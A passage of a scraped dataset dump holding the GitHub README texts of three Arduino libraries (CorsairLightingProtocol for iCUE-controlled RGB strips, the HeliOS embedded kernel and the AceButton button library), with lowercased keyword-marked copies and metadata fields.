LEDs brightness even if you set the brightness to max in the iCUE Device Settings. But there are good news, we can increase the brightness with the Arduino so we can use the full brightness of our LEDs. Add the CLP::fixIcueBrightness function to the onUpdateHook in the setup function as shown in the example. If there are multiple functions called in onUpdateHook, fixIcueBrightness should be the first. Only use this function with LS100 and LT100 devices!\nledController.onUpdateHook(0, []() {\nCLP::fixIcueBrightness(&ledController, 0);\n});\nReverse direction of LED Strip\nIf you want to change the direction of the LEDs of the Strip without physically change the strip, the CLP::reverse function can be used. The reverse function must be called be for scaling.\nledController.onUpdateHook(0, []() {\nCLP::reverse(&ledController, 0);\n});\nHardware Lighting mode\nThe Hardware Lighting mode can be configured in iCUE. It allows you the set lighting effects that will be active when iCUE is not running. This is the case when the PC is off, in sleep mode, booting or the user is logged out. So if you want to have lighing effects in all these situations, use the Hardware Lighting mode. If you don't want it, configure a static black color.\nLicense\nThis project is licensed under the Apache 2.0 License.\nDISCLAIMERS\nThis is a DO IT YOURSELF project, use at your own risk!\nCredits\nHoodLoader2\nArduino HID Project\nProtocol Information\nRelated projects\nCorsairArduinoController\nCorsairLightingProtocolBoards\nOpenCorsairLighting", "link": "https://github.com/Legion2/CorsairLightingProtocol", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "corsair lighting protocol\nthis library can be used to integrate custom/unofficial rgb strips with icue. this is not an official corsair project.\nfeatures\nadd support of corsair diy device protocol to arduino.\ncontrol leds with the corsair icue software.\nsupport common led chipsets. (e.g. ws2812b, ws2801)\nsupport fastled.\nsupported platform: arduino avr\nhardware lighting mode.\nuse multiple devices at the same time.\nrepeat or scale led channels to arbitrary size.\nsupported devices\nlighting node pro\ncommander pro\nlighting node core\nls100 smart lighting controller\nlt100 smart lighting towers\ngetting started\nthis project is an arduino library called \"corsair lighting protocol\". it can be used to control arduino boards with icue. this project provides example sketches for easy use with arduino ide.\nrequirements\ninstall the libraries\ncreate a lighting node pro\nuse the lighting node pro\nrequirements\nthe library is compatible with all boards using the mcu atmega32u4. this includes arduino leonardo, sparkfun pro micro, arduino micro, and adafruit 32u4 avr boards. it also supports the arduino uno and arduino mega, but this requires the hoodloader2 bootloader, see this wiki for more details. it is not compatible with atmega328 (arduino nano), stm8s103f3, teensy, esp8266 and esp32 see list of architecture/platform for a detailed description why they are not supported. in the rest of the documentation \"arduino\" is used as a synonym for all supported boards regardless of the manufacturer.\nwhen you have problems with a board not listed here, please open an issue.\ninstall the libraries\nto use this library you must install it with the library-manager. open the library-manager in arduino ide via tools->manage libraries... search for \"corsair lighting protocol\" and install the corsair lighting protocol library. this library also requires the fastled library. search for \"fastled\" in the library-manager and install the fastled library.\ncreate a lighting node pro\nthis guide will teach you how to create a lighting node pro with an arduino leonardo compatible board. if you have an arduino uno or mega, see the other guide.\nopen the example \"lightingnodepro\", you can find it in arduino ide in the file menu->examples->corsair lighting protocol->lightingnodepro. if you can't open the lightingnodepro example the corsair lighting protocol library is not installed correctly.\ninstall the clp boards. they can be installed by following the clp boards installation guide. after installation it should be possible to select the clp boards in the arduino ide as shown in the screenshot below. if your are using a sparkfun pro micro also install the sparkfun boards definition.\nupload the \"lightingnodepro\" sketch to your arduino.\ndo the wiring. for more information on how to wire the leds and how to set up the leds in the code see the links.\nverify your device works as expected. open the windows settings->devices->other devices. somewhere in the list of devices, there should be a device called \"lighting node pro\".\nnow open icue there you should see the \"lighting node pro\".\nif you have any problem during setup you may find the solution in the troubleshooting section.\nuse the lighting node pro\nin icue open the \"lighting setup\" tab of the lighting node pro(lnp) and set for both lighting channels the device to \"rgb light strip\" and the amount to a tenth of the leds you have. icue groups the leds into groups of ten. so if you have 20 leds, set the amount to 2. now you can create lighting effects in the \"lighting channel #\" tabs.\ndocumentation\napi documentation\nhow it works\nuse of multiple devices\nrepeat or scale led channels\nincrease the brightness of the leds\nhardware lighting mode\nhow it works\nthis library uses the usb hid interface of the atmega32u4. after uploading a sketch with the library and selected clp boards, icue recognizes the arduino as a corsair device, because the clp boards use usb ids of corsair. in icue you can then select the device and set some lighting effects. icue sends these via the hid protocol to the arduino. these commands are understood by the library and converted into lighting effects on the rgb strips connected to the arduino. the fastled library is used to control the leds.\nuse of multiple devices\neach device has two unique ids, that is, they should be unique. you must give each device a unique id. there are two ids that must be changed serial number and deviceid.\nthe serial number can be set in the constructor of corsairlightingprotocolhid and clpusbserialbridge as shown in the example.\nconst char myserialnumber[] progmem = \"202b6949a967\";\ncorsairlightingprotocolhid chid(&clp, myserialnumber);\nthe serial number may only consist of hex characters (0-9 and a-f).\nthe deviceid can be set with the setdeviceid function of corsairlightingfirmware.\nvoid setup() {\nbyte deviceid[4] = { 0x9a, 0xda, 0xa7, 0x8e };\nfirmware.setdeviceid(deviceid);\n...\n}\nalternative\nthe deviceid can be changed with the deviceidtool. upload the deviceidtool sketch and then open the serial monitor with baudrate 115200. the -----> tool !!!  displays the current deviceid, you can type in a new deviceid that is saved on the arduino. after that, you can upload another sketch.\nrepeat or scale led channels\nyou can repeat or scale led channel controlled by icue onto physical led strips. this is very useful if you have very long led strips that are longer than 60/96/135 leds, which is the maximum number icue supports.\nto repeat or scale a led channel you must apply the clp::repeat or the clp:scale function in the update hook of the fastledcontroller. see the repeatandscale example for the complete code. both functions take the fastledcontroller pointer and the channel index as arguments. additionally, the repeat function takes as an argument how often the led channel should be repeated. for example, if you want to duplicate the channel you must pass 2 as argument. the scale function takes as third argument the length of the physical led strip to which it scales the channel using integer scaling. for example you have 144 physical leds on you strip and 60 on the led channel. then the third argument of the scale function is 144.\nfor both functions it's important, that the crgb arrays have at least the length of the physical led strip. this means if your led channel from icue has 50 leds and you use the repeat function to control 100 physical leds you must declare the crgb array at least with a length of 100.\nincrease the brightness of the leds\nwhen using ls100 or lt100 icue only uses 50% of the leds brightness even if you set the brightness to max in the icue device settings. but there are good news, we can increase the brightness with the arduino so we can use the full brightness of our leds. add the clp::fixicuebrightness function to the onupdatehook in the setup function as shown in the example. if there are multiple functions called in onupdatehook, fixicuebrightness should be the first. only use this function with ls100 and lt100 devices!\nledcontroller.onupdatehook(0, []() {\nclp::fixicuebrightness(&ledcontroller, 0);\n});\nreverse direction of led strip\nif you want to change the direction of the leds of the strip without physically change the strip, the clp::reverse function can be used. the reverse function must be called be for scaling.\nledcontroller.onupdatehook(0, []() {\nclp::reverse(&ledcontroller, 0);\n});\nhardware lighting mode\nthe hardware lighting mode can be configured in icue. it allows you the set lighting effects that will be active when icue is not running. this is the case when the pc is off, in sleep mode, booting or the user is logged out. so if you want to have lighing effects in all these situations, use the hardware lighting mode. if you don't want it, configure a static black color.\nlicense\nthis project is licensed under the apache 2.0 license.\ndisclaimers\nthis is a do it yourself project, use at your own risk!\ncredits\nhoodloader2\narduino hid project\nprotocol information\nrelated projects\ncorsairarduinocontroller\ncorsairlightingprotocolboards\nopencorsairlighting", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000173, "year": null}, {"Unnamed: 0": 2224, "autor": 184, "date": null, "content": "Overview\nHeliOS is an embedded operating system that is free for anyone to use. While called an operating system for simplicity, HeliOS is better described as a multitasking kernel for embedded systems. HeliOS is very small. In fact, it is small enough to run on most 8-bit microcontrollers including the popular AVR based Arduino Uno. Written entirely in C, HeliOS runs on a variety of microcontrollers and integrates easily into any project. HeliOS is also easy to learn with an Application Programming Interface (API) consisting of only 21 function calls. HeliOS contains the following key features:\nCooperative Multitasking (Run-time Balanced)\nEvent Driven Multitasking\nTask Notification/Messaging\nTimers\nManaged Memory\nNon-Preemptive (no mutexs! no deadlocks! no race conditions! no headaches!)\nAs noted in the key features, HeliOS supports two types of multitasking: cooperative and event driven. Cooperative multitasking embedded operating systems and task schedulers often use a round-robin scheduling strategy. However, HeliOS uses a run-time balanced strategy which ensures tasks with shorter run-times are prioritized over tasks with longer run-times. This ensures all running tasks receive approximately equal total run-time without using context switching. The other multitasking option available in HeliOS is event driven multitasking, which uses the wait/notify and timer interfaces. Mixing cooperative and event driven tasks in HeliOS is not a problem.\nWhy HeliOS\nThere are already so many great and proven RTOS and scheduler options available, then why HeliOS? That is certainly a valid question. HeliOS was never intended to replace or compete with the other options already available today (if you have not checked out FreeRTOS - you should, it is nothing short of an amazing RTOS for embedded and is more accessible today than ever before through the Arduino Library Manager). HeliOS, however, due to its size and simplicity, is intended to play in the space between RTOS's and task schedulers. HeliOS is tiny (smaller than FreeRTOS), easy to use and a great place to start for enthusiasts, hobbyists and researchers.\nWhat's Happening\nHeliOS is continuously being improved. Development is currently occurring in weekly sprints resulting in a new release at the end of each sprint. This schedule will continue until a substantial portion of the development backlog, which includes improvements to the HeliOS Programmer's Guide, code documentation, additional example sketches and testing, is complete. If you are looking to check-out the latest developments in HeliOS, clone the develop branch. But remember that the source code and documentation in the develop branch is under active development and may contain errors. In the meantime, don't forget to star or watch the HeliOS repository and check back frequently.\nGetting Started\nArduino\nBecause HeliOS is compliant with the Arduino 1.5 (rev. 2.2) Library Specification, getting up and running is quick and easy. HeliOS can be installed directly from the Arduino Library Manager or downloaded and installed manually. Both options are described here. You can also refer to the auto-generated instructions from ArduBadge here. Once up and running, check out one of the example sketches or refer to the HeliOS Programmer's Guide in the Documentation section.\nOther Microcontrollers\nWhile built-in support currently only exists for the Arduino AVR, SAM and SAMD architectures, HeliOS is easily ported to a variety of other microcontrollers. Because the project is currently focused on supporting the Arduino community, no plans currently exist for adding built-in support for additional microcontrollers and tool-chains.\nLinux & Microsoft Windows\nBuilt-in support exists for building and running HeliOS in user-land on Linux and Microsoft Windows. When running in user-land, HeliOS acts like a threading library for applications. To target Linux or Microsoft Windows, (as shown below) simply un-comment the appropriate C preprocessor directive in the header file HeliOS.h and build using GCC or Microsoft Visual C++. The files needed to build HeliOS in user-land on Linux and Microsoft Windows can be found in extras/linux and extras/windows directories respectively.\n/*\n* Un-comment to compile on Linux or Microsoft\n* Windows.\n* #define OTHER_ARCH_LINUX\n* #define OTHER_ARCH_WINDOWS\n*/\nDocumentation\nThe HeliOS Programmer's Guide is a work in progress. What is available today can be found here. If you are interested in contributing to the HeliOS Programmer's Guide, please see the Contributing section for details.\nExample\nMany embedded projects on microcontrollers implement what is called a \"super loop\". A super loop is a loop that never exits (i.e while(1){}) and contains most of the code executed by the microcontroller. The problem with super loops is they can grow out of control and become difficult to manage. This becomes especially challenging given the relatively few options for controling timing (e.g. delay()). Unfortunately the use of delay() to control timing also means the microcontroller is unable to perform other operations (at least without the help of an ISR) until delay() returns. Below is an example of how easy it is to leverage the event driven multitasking capabilities within HeliOS.\nArduino \"Blink\" Example\nBelow is a copy of the traditional Arduino \"Blink\" example code.\nvoid setup() {\npinMode(LED_BUILTIN, OUTPUT);\n}\nvoid loop() {\ndigitalWrite(LED_BUILTIN, HIGH);\ndelay(1000);\ndigitalWrite(LED_BUILTIN, LOW);\ndelay(1000);\n}\nHeliOS \"Blink\" Example\nBelow is the Arduino \"Blink\" example code implemented using HeliOS. In this example, a HeliOS task, which alternates the microcontroller's GPIO pin state between high and low, is added in a \"wait\" state and a timer is set instructing HeliOS's scheduler to execute the task every 1,000,000 microseconds. That's it!\n/*\n* Include the standard HeliOS header for Arduino sketches. This header\n* includes the required HeliOS header files automatically.\n*/\n#include <HeliOS_Arduino.h>\n/*\n* Declare and initialize an int to maintain the state of\n* the built-in LED.\n*/\nvolatile int ledState = 0;\n/*\n* The task definition for taskBlink() which will\n* be executed by HeliOS every 1,000,000 microseconds\n* (1 second).\n*/\nvoid taskBlink(xTaskId id_) {\n/*\n* If the state is 0 or LOW then set the state to\n* 1 or HIGH. Likewise, if the state is 1 or HIGH\n* then set the state to LOW.\n*/\nif (ledState) {\n/*\n* Set the state of the digital GPIO pin associated\n* with the built-in LED to LOW.\n*/\ndigitalWrite(LED_BUILTIN, LOW);\n/*\n* Update the int containing the state of the build-in\n* LED accordingly.\n*/\nledState = 0;\n} else {\n/*\n* Set the state of the digital GPIO pin associated\n* with the built-in LED to HIGH.\n*/\ndigitalWrite(LED_BUILTIN, HIGH);\n/*\n* Update the int containing the state of the built-in\n* LED accordingly.\n*/\nledState = 1;\n}\n}\nvoid setup() {\n/*\n* Declare an xTaskId to hold the the task id\n* and initialize.\n*/\nxTaskId id = 0;\n/*\n* Call xHeliOSSetup() to initialize HeliOS and\n* its data structures. xHeliOSSetup() must be\n* called before any other HeliOS function call.\n*/\nxHeliOSSetup();\n/*\n* Set the mode of the digital GPIO pin associated\n* with the built-in LED to OUTPUT only.\n*/\npinMode(LED_BUILTIN, OUTPUT);\n/*\n* Add the task taskBlink() to HeliOS by passing\n* xTaskAdd() the friendly name of the task as well\n* as a callback pointer to the task function.\n*/\nid = xTaskAdd(\"TASKBLINK\", &taskBlink);\n/*\n* Call xTaskWait() to place taskBlink() into a wait\n* state by passing xTaskWait() the task id. A task\n* must be in a wait state to respond to timer events.\n*/\nxTaskWait(id);\n/*\n* Set the timer interval for taskBlink() to 1,000,000 microseconds\n* (1 second). HeliOS automatically begins incrementing\n* the timer for the task once the timer interval is set.\n*/\nxTaskSetTimer(id, 1000000);\n}\nvoid loop() {\n/*\n* Momentarily pass control to HeliOS by calling the\n* xHeliOSLoop() function call. xHeliOSLoop() should be\n* the only code inside of the sketch's loop() function.\n*/\nxHeliOSLoop();\n}\nReleases\nAll releases, including the current release, can be found here.\n0.2.6 - added built-in support for ESP8266 and minor internal updates\n0.2.5 - numerous internal enhancements including improved time precision and scheduler now gracefully handles overflow of run-time timer\n0.2.4 - additional example Arduino sketches and other code improvements\n0.2.3 - Improved protection of system state, new examples, improved code documentation and some maintainability enhancements\n0.2.2 - Additional function calls, minor fixes and documentation enhancements\n0.2.1 - The first official release\nContributing\nWhile all contributions are welcome, contributions are needed most in the following areas:\nHeliOS Programmer's Guide\nCode Documentation, Readability and Maintainability\nExample Sketches\nTesting\nTo contribute, simply create a pull request with your changes. Please fork from the develop branch as master is kept even with the current release. Pull requests are typically responded to within 48 hours.\nThank you\nNo free and open source software project has been successful without the contributions of many. This space is reserved for recognizing people who have made meaningful contributions to HeliOS. All contributors are listed in alphabetical order.\nJakub Rakus\nJulien Peyregne\nKai Wurtz\nKonidem\nStig Bjorlykke\nThomas Hornschuh\nAlso, special thanks to Gil Maimon for the great website ArduBadge.\nLicense & Trademarks\nHeliOS is copyrighted open source software licensed under the Free Software Foundation's GNU General Public License Version 3. The license can be found here.\nMicrosoft Windows and Microsoft Visual C++ are registered trademarks of Microsoft Corporation in the United States and/or other countries.\nImportant\nHeliOS is not certified for use in safety-critical applications. The HeliOS source code, whether in full or in part, must never be used in applications where a risk to life exists.", "link": "https://github.com/MannyPeterson/HeliOS", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "overview\nhelios is an embedded operating system that is free for anyone to use. while called an operating system for simplicity, helios is better described as a multitasking kernel for embedded systems. helios is very small. in fact, it is small enough to run on most 8-bit microcontrollers including the popular avr based arduino uno. written entirely in c, helios runs on a variety of microcontrollers and integrates easily into any project. helios is also easy to learn with an application programming interface (api) consisting of only 21 function calls. helios contains the following key features:\ncooperative multitasking (run-time balanced)\nevent driven multitasking\ntask notification/messaging\ntimers\nmanaged memory\nnon-preemptive (no mutexs! no deadlocks! no race conditions! no headaches!)\nas noted in the key features, helios supports two types of multitasking: cooperative and event driven. cooperative multitasking embedded operating systems and task schedulers often use a round-robin scheduling strategy. however, helios uses a run-time balanced strategy which ensures tasks with shorter run-times are prioritized over tasks with longer run-times. this ensures all running tasks receive approximately equal total run-time without using context switching. the other multitasking option available in helios is event driven multitasking, which uses the wait/notify and timer interfaces. mixing cooperative and event driven tasks in helios is not a problem.\nwhy helios\nthere are already so many great and proven rtos and scheduler options available, then why helios? that is certainly a valid question. helios was never intended to replace or compete with the other options already available today (if you have not checked out freertos - you should, it is nothing short of an amazing rtos for embedded and is more accessible today than ever before through the arduino library manager). helios, however, due to its size and simplicity, is intended to play in the space between rtos's and task schedulers. helios is tiny (smaller than freertos), easy to use and a great place to start for enthusiasts, hobbyists and researchers.\nwhat's happening\nhelios is continuously being improved. development is currently occurring in weekly sprints resulting in a new release at the end of each sprint. this schedule will continue until a substantial portion of the development backlog, which includes improvements to the helios programmer's guide, code documentation, additional example sketches and testing, is complete. if you are looking to check-out the latest developments in helios, clone the develop branch. but remember that the source code and documentation in the develop branch is under active development and may contain errors. in the meantime, don't forget to star or watch the helios repository and check back frequently.\ngetting started\narduino\nbecause helios is compliant with the arduino 1.5 (rev. 2.2) library specification, getting up and running is quick and easy. helios can be installed directly from the arduino library manager or downloaded and installed manually. both options are described here. you can also refer to the auto-generated instructions from ardubadge here. once up and running, check out one of the example sketches or refer to the helios programmer's guide in the documentation section.\nother microcontrollers\nwhile built-in support currently only exists for the arduino avr, sam and samd architectures, helios is easily ported to a variety of other microcontrollers. because the project is currently focused on supporting the arduino community, no plans currently exist for adding built-in support for additional microcontrollers and -----> tool !!! -chains.\nlinux & microsoft windows\nbuilt-in support exists for building and running helios in user-land on linux and microsoft windows. when running in user-land, helios acts like a threading library for applications. to target linux or microsoft windows, (as shown below) simply un-comment the appropriate c preprocessor directive in the header file helios.h and build using gcc or microsoft visual c++. the files needed to build helios in user-land on linux and microsoft windows can be found in extras/linux and extras/windows directories respectively.\n/*\n* un-comment to compile on linux or microsoft\n* windows.\n* #define other_arch_linux\n* #define other_arch_windows\n*/\ndocumentation\nthe helios programmer's guide is a work in progress. what is available today can be found here. if you are interested in contributing to the helios programmer's guide, please see the contributing section for details.\nexample\nmany embedded projects on microcontrollers implement what is called a \"super loop\". a super loop is a loop that never exits (i.e while(1){}) and contains most of the code executed by the microcontroller. the problem with super loops is they can grow out of control and become difficult to manage. this becomes especially challenging given the relatively few options for controling timing (e.g. delay()). unfortunately the use of delay() to control timing also means the microcontroller is unable to perform other operations (at least without the help of an isr) until delay() returns. below is an example of how easy it is to leverage the event driven multitasking capabilities within helios.\narduino \"blink\" example\nbelow is a copy of the traditional arduino \"blink\" example code.\nvoid setup() {\npinmode(led_builtin, output);\n}\nvoid loop() {\ndigitalwrite(led_builtin, high);\ndelay(1000);\ndigitalwrite(led_builtin, low);\ndelay(1000);\n}\nhelios \"blink\" example\nbelow is the arduino \"blink\" example code implemented using helios. in this example, a helios task, which alternates the microcontroller's gpio pin state between high and low, is added in a \"wait\" state and a timer is set instructing helios's scheduler to execute the task every 1,000,000 microseconds. that's it!\n/*\n* include the standard helios header for arduino sketches. this header\n* includes the required helios header files automatically.\n*/\n#include <helios_arduino.h>\n/*\n* declare and initialize an int to maintain the state of\n* the built-in led.\n*/\nvolatile int ledstate = 0;\n/*\n* the task definition for taskblink() which will\n* be executed by helios every 1,000,000 microseconds\n* (1 second).\n*/\nvoid taskblink(xtaskid id_) {\n/*\n* if the state is 0 or low then set the state to\n* 1 or high. likewise, if the state is 1 or high\n* then set the state to low.\n*/\nif (ledstate) {\n/*\n* set the state of the digital gpio pin associated\n* with the built-in led to low.\n*/\ndigitalwrite(led_builtin, low);\n/*\n* update the int containing the state of the build-in\n* led accordingly.\n*/\nledstate = 0;\n} else {\n/*\n* set the state of the digital gpio pin associated\n* with the built-in led to high.\n*/\ndigitalwrite(led_builtin, high);\n/*\n* update the int containing the state of the built-in\n* led accordingly.\n*/\nledstate = 1;\n}\n}\nvoid setup() {\n/*\n* declare an xtaskid to hold the the task id\n* and initialize.\n*/\nxtaskid id = 0;\n/*\n* call xheliossetup() to initialize helios and\n* its data structures. xheliossetup() must be\n* called before any other helios function call.\n*/\nxheliossetup();\n/*\n* set the mode of the digital gpio pin associated\n* with the built-in led to output only.\n*/\npinmode(led_builtin, output);\n/*\n* add the task taskblink() to helios by passing\n* xtaskadd() the friendly name of the task as well\n* as a callback pointer to the task function.\n*/\nid = xtaskadd(\"taskblink\", &taskblink);\n/*\n* call xtaskwait() to place taskblink() into a wait\n* state by passing xtaskwait() the task id. a task\n* must be in a wait state to respond to timer events.\n*/\nxtaskwait(id);\n/*\n* set the timer interval for taskblink() to 1,000,000 microseconds\n* (1 second). helios automatically begins incrementing\n* the timer for the task once the timer interval is set.\n*/\nxtasksettimer(id, 1000000);\n}\nvoid loop() {\n/*\n* momentarily pass control to helios by calling the\n* xheliosloop() function call. xheliosloop() should be\n* the only code inside of the sketch's loop() function.\n*/\nxheliosloop();\n}\nreleases\nall releases, including the current release, can be found here.\n0.2.6 - added built-in support for esp8266 and minor internal updates\n0.2.5 - numerous internal enhancements including improved time precision and scheduler now gracefully handles overflow of run-time timer\n0.2.4 - additional example arduino sketches and other code improvements\n0.2.3 - improved protection of system state, new examples, improved code documentation and some maintainability enhancements\n0.2.2 - additional function calls, minor fixes and documentation enhancements\n0.2.1 - the first official release\ncontributing\nwhile all contributions are welcome, contributions are needed most in the following areas:\nhelios programmer's guide\ncode documentation, readability and maintainability\nexample sketches\ntesting\nto contribute, simply create a pull request with your changes. please fork from the develop branch as master is kept even with the current release. pull requests are typically responded to within 48 hours.\nthank you\nno free and open source software project has been successful without the contributions of many. this space is reserved for recognizing people who have made meaningful contributions to helios. all contributors are listed in alphabetical order.\njakub rakus\njulien peyregne\nkai wurtz\nkonidem\nstig bjorlykke\nthomas hornschuh\nalso, special thanks to gil maimon for the great website ardubadge.\nlicense & trademarks\nhelios is copyrighted open source software licensed under the free software foundation's gnu general public license version 3. the license can be found here.\nmicrosoft windows and microsoft visual c++ are registered trademarks of microsoft corporation in the united states and/or other countries.\nimportant\nhelios is not certified for use in safety-critical applications. the helios source code, whether in full or in part, must never be used in applications where a risk to life exists.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000184, "year": null}, {"Unnamed: 0": 2225, "autor": 185, "date": null, "content": "AceButton\nAn adjustable, compact, event-driven button library for Arduino platforms.\nThis library provides classes which accept inputs from a mechanical button connected to a digital input pin on the Arduino. The library should be able to handle momentary buttons, maintained buttons, and switches, but it was designed primarily for momentary buttons.\nThe library is named \"AceButton\" because:\nmany configurations of the button are adjustable, either at compile-time or run-time\nthe library is optimized to create compact objects which take up a minimal amount of static memory\nthe library detects changes in the button state and sends events to a user-defined EventHandler callback function\nMost of the features of the library can be accessed through 2 classes, 1 callback function, and 1 interface:\nAceButton (class)\nButtonConfig (class)\nEventHandler (typedef)\nIEventHandler (interface)\nThe AceButton class contains the logic for debouncing and determining if a particular event has occurred.\nThe ButtonConfig class holds various timing parameters, the event handler, code for reading the button, and code for getting the internal clock.\nThe EventHandler is a user-defined callback function with a specific signature which is registered with the ButtonConfig object. When the library detects interesting events, the callback function is called by the library, allowing the client code to handle the event.\nThe IEventHandler is an interface (pure abstract class) that provides an alternative to the EventHandler. Instead of using a callback function, an object of type IEventHandler can be used to handle the button events.\nThe supported events are:\nAceButton::kEventPressed\nAceButton::kEventReleased\nAceButton::kEventClicked\nAceButton::kEventDoubleClicked\nAceButton::kEventLongPressed\nAceButton::kEventRepeatPressed\nAceButton::kEventLongReleased (v1.8)\nThe basic ButtonConfig class assumes that each button is connected to a single digital input pin. In some situations, the number of buttons that we want is greater than the number of input pins available. This library provides 2 subclasses of ButtonConfig which may be useful:\nEncodedButtonConfig\nSupports binary encoded buttons, to read 2^N - 1 buttons using N pins (e.g. 7 buttons using 3 digital pins).\nLadderButtonConfig\nSupports 1-8 buttons (maybe more) on a single analog pin through a resistor ladder. The analogRead() method is used to read the different voltage levels corresponding to each button.\nBoth EncodedButtonConfig and LadderButtonConfig support all 7 events listed above (e.g. kEventClicked and kEventDoubleClicked).\nVersion: 1.9.1 (2021-08-10)\nChangelog: CHANGELOG.md\nTable of Contents\nFeatures\nHelloButton\nInstallation\nExternal Dependencies\nSource Code\nDocumentation\nExamples\nUsage\nInclude Header and Use Namespace\nPin Wiring and Initialization\nAceButton Class\nSampling Rate\nCompiler Error on Pin 0\nButtonConfig Class\nSystem ButtonConfig\nConfiguring the EventHandler\nTiming Parameters\nHardware Dependencies\nMultiple ButtonConfig Instances\nEventHandler Typedef\nEventHandler Signature\nEventHandler Parameters\nOne EventHandler Per ButtonConfig\nEventHandler Tips\nEvent Types\nButtonConfig Feature Flags\nEvent Activation\nEvent Suppression\nSingle Button Simplifications\nMultiple Buttons\nAdvanced Topics\nObject-based Event Handler\nDistinguishing Clicked and DoubleClicked\nDistinguishing Pressed and LongPressed\nEvents After Reboot\nOrphaned Clicks\nBinary Encoded Buttons\nResistor Ladder Buttons\nDynamic Allocation on the Heap\nDigital Write Fast\nResource Consumption\nSizeOf Classes\nFlash And Static Memory\nCPU Cycles\nSystem Requirements\nHardware\nTool Chain\nOperating System\nBackground Motivation\nNon-goals\nLicense\nFeedback and Support\nAuthor\nFeatures\nHere are the high-level features of the AceButton library:\ndebounces the mechanical contact\nsupports both pull-up and pull-down wiring\nevent-driven through a user-defined EventHandler callback function\nevent-driven through an object-based IEventHandler (>= v1.6)\nsupports 7 event types:\nkEventPressed\nkEventReleased\nkEventClicked\nkEventDoubleClicked\nkEventLongPressed\nkEventRepeatPressed\nkEventLongReleased\nadjustable configurations at runtime or compile-time\ntiming parameters\ndigitalRead() button read function can be overridden\nmillis() clock function can be overridden\nsmall memory footprint\neach AceButton consumes 14 bytes (8-bit) or 16 bytes (32-bit)\neach ButtonConfig consumes 18 bytes (8-bit) or 24 bytes (32-bit)\none System ButtonConfig instance created automatically by the library\n970-2180 bytes of flash memory for the simple case of 1 AceButton and 1 ButtonConfig, depending on 8-bit or 32-bit processors\nsupports multiple buttons on shared pins using various circuits\nBinary Encoded buttons (e.g. 7 buttons using 3 pins)\nResistor Ladder buttons (e.g. 5 buttons on a single analog pin)\nonly 13-15 microseconds (on 16MHz ATmega328P) per polling call to AceButton::check()\nextensive testing\nthoroughly unit tested using AUnit\ntested on Arduino AVR (UNO, Nano, Micro etc), Teensy ARM (LC and 3.2), SAMD21 (Arduino Zero compatible), ESP8266 and ESP32\nCompared to other Arduino button libraries, I think the unique or exceptional features of the AceButton library are:\nmany supported event types (e.g. LongPressed and RepeatPressed)\nable to distinguish between Clicked and DoubleClicked\nsmall memory usage\nthorough unit testing\nsupport for multiple buttons using Binary Encoding or a Resistor Ladder\nHelloButton\nHere is a simple program (see examples/HelloButton) which controls the builtin LED on the Arduino board using a momentary button connected to PIN 2.\n#include <AceButton.h>\nusing namespace ace_button;\nconst int BUTTON_PIN = 2;\nconst int LED_ON = HIGH;\nconst int LED_OFF = LOW;\nAceButton button(BUTTON_PIN);\nvoid handleEvent(AceButton*, uint8_t, uint8_t);\nvoid setup() {\npinMode(LED_BUILTIN, OUTPUT);\npinMode(BUTTON_PIN, INPUT_PULLUP);\nbutton.setEventHandler(handleEvent);\n}\nvoid loop() {\nbutton.check();\n}\nvoid handleEvent(AceButton* /*button*/, uint8_t eventType,\nuint8_t /*buttonState*/) {\nswitch (eventType) {\ncase AceButton::kEventPressed:\ndigitalWrite(LED_BUILTIN, LED_ON);\nbreak;\ncase AceButton::kEventReleased:\ndigitalWrite(LED_BUILTIN, LED_OFF);\nbreak;\n}\n}\n(The button and buttonState parameters are commented out to avoid an unused parameter warning from the compiler. We can't remove the parameters completely because the method signature is defined by the EventHandler typedef.)\nInstallation\nThe latest stable release is available in the Arduino IDE Library Manager. Search for \"AceButton\". Click install.\nThe development version can be installed by cloning the GitHub repository (https://github.com/bxparks/AceButton), checking out the develop branch, then manually copying over the contents to the ./libraries directory used by the Arduino IDE. (The result is a directory named ./libraries/AceButton.)\nThe master branch contains the tagged stable releases.\nExternal Dependencies\nThe core of the library is self-contained and has no external dependencies.\nThe some programs in examples/ may depend on:\nAceCommon (https://github.com/bxparks/AceCommon)\nThe unit tests under tests depend on:\nAUnit (https://github.com/bxparks/AUnit)\nSource Code\nThe source files are organized as follows:\nsrc/AceButton.h - main header file\nsrc/ace_button/ - all implementation files\nsrc/ace_button/testing/ - internal testing files\ntests/ - unit tests which require AUnit\nexamples/ - example sketches\nDocumentation\nthis README.md\ndocs/binary_encoding/README.md\nExplanation of reading buttons through binary encoding using the Encoded4To2ButtonConfig, Encoded8To3ButtonConfig, EncodedButtonConfig classes\ndocs/resistor_ladder/README.md\nExplanation of reading buttons through a resistor ladder using the LadderButtonConfig class\nDoxygen docs published on GitHub Pages which can help navigate an unfamiliar code base.\nExamples\nThe following example sketches are provided:\nBasic Single Button\nHelloButton\nminimal program that reads a switch and control the built-in LED\nSingleButton\nsingle button wired with an internal pull-up resistor\nSingleButtonPullDown\nsame as SingleButton but with an external pull-down resistor\nSingleButtonUsingIEventHandler\nsame as SingleButton using an object-based IEventHandler\nStopwatch\nmeasures the speed of AceButton:check() with a start/stop/reset\nbutton uses kFeatureLongPress\nMultiple Buttons\nTwoButtonsUsingOneButtonConfig\ntwo buttons using one ButtonConfig\nTwoButtonsUsingTwoButtonConfigs\ntwo buttons using two ButtonConfigs\nThreeButtonsUsingOneButtonConfig\nthree buttons using one ButtonConfig\nused as a reference for ThreeButtonsUsingOneButtonConfigFast (below)\nTunerButtons\nimplements 5 radio buttons (tune-up, tune-down, and 3 presets)\nshows multiple ButtonConfig and EventHandler instances\nshows an example of how to use getId()\nuses kFeatureLongPress, kFeatureRepeatPress, kFeatureSuppressAfterLongPress, and kFeatureSuppressAfterRepeatPress\nArrayButtons\nshows how to define an array of AceButton and initialize them using the init() method in a loop\nSimultaneousButtons\ndetecting simultaneous button presses of 2 buttons using a custom IEventHandler\nDistinguishing Click versus Double-Click\nClickVersusDoubleClickUsingReleased\na way to distinguish between a kEventClicked from a kEventDoubleClicked using a kEventReleased instead\nClickVersusDoubleClickUsingSuppression\nanother way to dstinguish between a kEventClicked from a kEventDoubleClicked using the kFeatureSuppressClickBeforeDoubleClick flag at the cost of increasing the response time of the kEventClicked 